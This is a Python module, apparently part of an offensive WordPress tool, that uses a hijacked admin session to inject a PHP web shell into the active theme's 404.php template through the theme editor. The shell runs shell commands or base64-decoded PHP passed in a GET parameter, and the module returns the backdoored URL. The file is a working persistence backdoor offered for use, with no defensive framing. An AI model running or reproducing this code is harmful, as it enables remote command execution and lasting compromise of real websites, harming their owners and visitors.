from requests import Session
from bs4 import BeautifulSoup
from omega_wp.config import DEFAULT_HEADERS


class PayloadService:
    def __init__(self, wp_url: str, wp_admin_session: Session):
        self.wp_url = wp_url
        self.wp_admin_session = wp_admin_session
        self.payload = "<?php if(isset($_GET['omega'])){ if(isset($_GET['php'])){ eval(base64_decode($_GET['omega'])); }else{ system($_GET['omega']); } }?>\n"

    def drop_payload(self) -> str:
        active_theme_name = self.get_theme_name()
        form_data = self.get_theme_404_template_form_data(active_theme_name)

        if(not self.is_payload_already_dropped(form_data['newcontent'])):
            form_data['newcontent'] = self.payload + form_data['newcontent']
            for key in form_data:
                form_data[key]

            response = self.wp_admin_session.post(f'{self.wp_url}/wp-admin/theme-editor.php', headers=DEFAULT_HEADERS, data=form_data)
            if(not response.ok):
                raise Exception('Error updating the template')

        return f'{self.wp_url}/wp-content/themes/{active_theme_name}/404.php'

    def get_theme_name(self) -> str:
        response = self.wp_admin_session.get(f'{self.wp_url}/wp-admin/themes.php', headers=DEFAULT_HEADERS)
        if(not response.ok):
            raise Exception('Error getting themes')
        soup = BeautifulSoup(response.text, 'lxml')

        active_theme_div = soup.find('div', attrs={'class': 'theme active'})
        active_theme_raw = active_theme_div.findChildren(
            'h2', attrs={'class': 'theme-name'})[0]
        active_theme_name = active_theme_raw.get('id').split('-')[0]

        return active_theme_name

    def get_theme_404_template_form_data(self, active_theme_name: str) -> dict:
        response = self.wp_admin_session.get(f'{self.wp_url}/wp-admin/theme-editor.php?file=404.php&theme={active_theme_name}', headers=DEFAULT_HEADERS)
        if(not response.ok):
            raise Exception('Error getting theme data')
        soup = BeautifulSoup(response.text, 'lxml')

        html_form = soup.find('form', attrs={'id': 'template'})
        template_code = html_form.findChildren('textarea')[0].contents[0]
        hidden_inputs = html_form.findChildren(
            'input', attrs={'type': 'hidden'})

        form_data = {}
        form_data['newcontent'] = template_code
        form_data['docs-list'] = ''
        for hidden_input in hidden_inputs:
            form_data[hidden_input.get('name')] = hidden_input.get('value')

        return form_data

    def is_payload_already_dropped(self, template_code: str) -> bool:
        return self.payload in template_code
